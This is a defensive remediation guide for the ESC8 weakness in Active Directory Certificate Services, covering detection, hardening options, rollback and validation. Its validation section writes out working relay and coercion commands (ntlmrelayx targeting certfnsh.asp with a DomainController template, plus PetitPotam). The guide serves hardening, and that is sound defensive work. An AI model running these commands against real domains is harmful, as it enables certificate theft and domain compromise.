# ESC8 — NTLM Relay to AD CS HTTP Endpoints

**Category:** Active Directory Certificate Services
**Operational Risk of Remediation:** Low-Medium
**Attacker Skill Required to Exploit:** Low (ntlmrelayx + Certipy)

## What it is

AD CS optionally exposes HTTP-based enrollment endpoints (Web Enrollment, Certificate Enrollment Web Service, Network Device Enrollment Service). By default these accept NTLM authentication and do not require Extended Protection for Authentication (EPA) or HTTPS-only.

An attacker coerces a privileged machine (e.g., a DC, via PetitPotam) to authenticate to the attacker, relays that NTLM auth to the CA's HTTP endpoint, and requests a client authentication certificate **as the relayed machine account**. The attacker then uses that certificate to obtain a TGT for the DC machine account → DCSync → domain compromise.

## What attack it enables

Domain takeover via NTLM relay, often with no domain credentials required at the start.

MITRE ATT&CK: T1557.001, T1649

## How to confirm it's present in your environment

Are AD CS HTTP endpoints enabled?

```powershell
# On the CA / Web Enrollment server
Get-WebApplication | Where-Object Path -match 'certsrv|certsvc|adpolicyprovider'
```

If `/certsrv` or `/CertSrv` responds at `http(s)://<ca-server>/certsrv`, the Web Enrollment role is installed.

```bash
# External check
curl -k -I https://<ca-server>/certsrv/
# 401 with WWW-Authenticate: Negotiate, NTLM = vulnerable to ESC8 unless EPA is on
```

Use Certipy to check directly:
```bash
certipy find -u user@example.local -p Pass -dc-ip <dc-ip> -enabled
# Look for "Web Enrollment" entries and whether they require channel binding
```

## What to audit before remediation

The big question: **does anyone actually use the Web Enrollment HTTP page?** In modern environments, almost no one does — auto-enrollment via GPO and the Certificates MMC snap-in (which uses RPC, not HTTP) cover almost every use case.

- Check IIS logs on the CA web server for `/certsrv` access over the past 60 days. Filter out admin IPs and monitoring tools.
- If it's basically unused, remove the role outright.
- If a small group uses it, keep the role but harden it (below).

## Remediation

In order of preference:

**Option 1 (best) — Uninstall Web Enrollment if unused:**
```powershell
Uninstall-AdcsWebEnrollment
# And remove the role:
Remove-WindowsFeature ADCS-Web-Enrollment
```

**Option 2: Disable NTLM on the AD CS web endpoints** (Microsoft's recommended mitigation for PetitPotam / ESC8):
- Open IIS Manager on the CA web server
- Select the `CertSrv` virtual directory → Authentication → disable `Windows Authentication` if Kerberos isn't required, or:
- Select Windows Authentication → Providers → remove `NTLM`, leave only `Negotiate:Kerberos`

**Option 3: Enable Extended Protection for Authentication (EPA) and HTTPS-only:**
- IIS Manager → CertSrv → Authentication → Windows Authentication → Advanced Settings
- Set "Extended Protection" to **Required**
- Ensure HTTPS is enforced and HTTP redirects to HTTPS, or remove HTTP binding entirely
- See Microsoft's KB5005413 for the full configuration

**Option 4: Block NTLM relay broadly via the EnableCertificateMappingMethods registry change** (post-May 2022 patches).

## What might break

- Removing Web Enrollment: anyone who manually requests certs via the web UI loses that workflow. They can use `certmgr.msc` → Personal → Request New Certificate (RPC-based) instead.
- Disabling NTLM: anything that authenticates to the CA web endpoint without Kerberos (rare) will fail.
- EPA Required: very old browsers without EPA support will fail. Modern browsers handle it transparently.

## Rollback

Reinstall the role: `Install-WindowsFeature ADCS-Web-Enrollment`, then `Install-AdcsWebEnrollment`. IIS auth providers re-add via IIS Manager. Effective immediately.

## Validate the fix

```bash
# After removing web enrollment
curl -k -I https://<ca-server>/certsrv/
# 404 = role removed

# After disabling NTLM
curl -k -I https://<ca-server>/certsrv/ -H "Authorization: NTLM ..."
# Should not negotiate NTLM
```

Attempt the relay attack from a lab attacker host:
```bash
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
# Coerce a DC: PetitPotam.py <attacker-ip> <dc-ip>
# Should fail to obtain a cert.
```

## References

- Microsoft: [KB5005413 Mitigating NTLM Relay Attacks on Active Directory Certificate Services](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
- SpecterOps: [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- MITRE ATT&CK: T1557.001
